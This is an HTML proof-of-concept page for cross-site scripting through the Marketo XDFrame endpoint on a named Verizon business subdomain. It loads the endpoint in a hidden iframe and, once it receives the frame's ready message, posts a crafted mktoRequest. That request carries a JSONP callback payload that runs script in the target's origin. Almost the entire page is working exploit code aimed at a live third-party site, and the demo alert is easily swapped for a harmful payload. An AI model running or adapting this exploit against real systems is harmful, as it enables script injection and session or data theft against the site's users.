<!DOCTYPE html>
<html>
<head>
    <title>Marketo XDFrame XSS PoC</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        #status { font-weight: bold; color: #d00; margin-bottom: 10px; }
        .log { background: #f4f4f4; padding: 10px; border: 1px solid #ccc; font-family: monospace; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h1>Marketo XDFrame XSS PoC</h1>
    <p>Target: <code>https://info.business.solution.verizon.com/index.php/form/XDFrame</code></p>
    <div id="status">Status: Waiting for XDFrame...</div>
    <div class="log" id="log">Logs:</div>

    <!-- The target XDFrame -->
    <iframe id="vulnerable_frame" 
            src="https://info.business.solution.verizon.com/index.php/form/XDFrame" 
            style="width:0;height:0;border:0;"></iframe>

    <script>
        var frame = document.getElementById('vulnerable_frame');
        var log = document.getElementById('log');

        function addToLog(msg) {
            log.innerText += "\n[" + new Date().toLocaleTimeString() + "] " + msg;
        }

        window.addEventListener("message", function(event) {
            if (event.origin !== "https://info.business.solution.verizon.com") return;

            try {
                var data = JSON.parse(event.data);
                addToLog("Received: " + event.data);

                if (data.mktoReady) {
                    document.getElementById('status').innerText = "Status: XDFrame Ready. Triggering XSS Attempt...";
                    triggerXSS();
                }
            } catch (e) {}
        });

        function triggerXSS() {
            var payload = {
                "mktoRequest": {
                    "id": "xss_exploit",
                    "ajaxParams": {
                        // Standard JSONP promotion bypass payload
                        "url": "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js?callback=alert('XSS_SUCCESS_'+document.domain)//",
                        "dataType": "jsonp"
                    }
                }
            };

            addToLog("Sending Payload to XDFrame...");
            frame.contentWindow.postMessage(JSON.stringify(payload), "*");
        }
    </script>
</body>
</html>
